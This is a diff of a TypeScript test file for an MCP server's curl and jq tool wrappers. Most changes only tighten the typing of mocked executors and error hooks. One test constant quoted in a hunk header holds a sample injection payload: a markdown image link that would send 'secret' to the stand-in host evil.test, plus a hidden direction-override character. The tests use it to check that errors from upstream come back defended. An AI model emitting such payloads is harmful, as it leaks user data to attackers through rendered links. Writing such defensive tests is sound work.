@@ -7,8 +7,8 @@
 
 import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
 import { applyConfigTransformsCurl, registerCurlToolWithHooks, registerJqToolWithHooks } from "./tool-wrapper.js";
-import type { AfterResponseHook, McpCurlConfig, CurlExecuteInput } from "../types/public.js";
-import type { Hooks } from "./types.js";
+import type { AfterResponseHook, McpCurlConfig, CurlExecuteInput, OnErrorHook } from "../types/public.js";
+import type { CurlToolExecutor, Hooks, JqToolExecutor } from "./types.js";
 import { DEFAULT_USER_AGENT } from "../config/index.js";
 import { clearInjectionDetectionMap } from "../security/detection-logger.js";
 import { isWrappedResult } from "../response/post-processor.js";
@@ -415,13 +415,13 @@ const THROWN_MESSAGE = "upstream said: ![x](https://evil.test/?d=secret) ‮evil
 
 describe("throwing hooks and executors leave through the wrap (invariant 1)", () => {
     const okExecutor = () =>
-        vi.fn().mockResolvedValue({ content: [{ type: "text", text: "ok" }], isError: false });
+        vi.fn<CurlToolExecutor>().mockResolvedValue({ content: [{ type: "text", text: "ok" }], isError: false });
 
     function registerWith(hooks: Partial<Hooks>, executor = okExecutor()) {
         const { server: fakeServer, tools } = captureTools();
-        const onError = vi.fn();
+        const onError = vi.fn<OnErrorHook>();
         registerCurlToolWithHooks(fakeServer, {
-            executor: executor as never,
+            executor,
             enabled: true,
             config: { enableSpotlighting: false } as McpCurlConfig,
             hooks: { beforeRequest: [], afterResponse: [], onError: [onError], ...hooks },
@@ -464,7 +464,7 @@ describe("throwing hooks and executors leave through the wrap (invariant 1)", ()
 
     it("a rejecting executor returns a defended error result and reaches onError", async () => {
         const error = new Error(THROWN_MESSAGE);
-        const { call, onError } = registerWith({}, vi.fn().mockRejectedValue(error));
+        const { call, onError } = registerWith({}, vi.fn<CurlToolExecutor>().mockRejectedValue(error));
 
         expectDefended(await call());
         expect(onError).toHaveBeenCalledTimes(1);
@@ -488,9 +488,9 @@ describe("a disabled tool's refusal leaves through the wrap (invariant 1)", () =
 
     it("curl_execute", async () => {
         const { server: fakeServer, tools } = captureTools();
-        const executor = vi.fn();
+        const executor = vi.fn<CurlToolExecutor>();
         registerCurlToolWithHooks(fakeServer, {
-            executor: executor as never,
+            executor,
             enabled: false,
             config: {} as McpCurlConfig,
             hooks,
@@ -508,9 +508,9 @@ describe("a disabled tool's refusal leaves through the wrap (invariant 1)", () =
 
     it("jq_query", async () => {
         const { server: fakeServer, tools } = captureTools();
-        const executor = vi.fn();
+        const executor = vi.fn<JqToolExecutor>();
         registerJqToolWithHooks(fakeServer, {
-            executor: executor as never,
+            executor,
             enabled: false,
             config: {} as McpCurlConfig,
             hooks,
